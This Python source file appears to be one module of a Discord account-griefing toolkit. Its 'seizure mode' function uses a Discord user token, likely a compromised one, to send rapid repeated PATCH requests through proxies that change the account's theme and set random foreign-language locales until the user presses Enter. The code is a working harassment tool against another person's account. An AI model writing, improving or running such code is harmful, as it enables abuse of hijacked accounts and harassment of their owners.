

import requests
import Solutions
import msvcrt
import random

from itertools import cycle
from time import sleep
from colorama import Fore

from util.plugins.common import print_slow, getheaders, proxy

def StartSeizure(token):
    print(f'{Fore.MAGENTA}Starting seizure mode {Fore.RESET}{Fore.WHITE}(Switching on/off Light/dark mode){Fore.RESET}\n')
    print_slow(f"{Fore.RED}Press ENTER to stop at anytime{Fore.RESET}")
    while True:
        modes = cycle(["light", "dark"])
        #cycle between light/dark mode and languages
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v7/users/@me/settings", proxies={"ftp": f'{proxy()}'}, headers=getheaders(token), json=setting)
        if msvcrt.kbhit():
            if msvcrt.getwche() == '\r':
                break
        sleep(0.1)
    Solutions.main()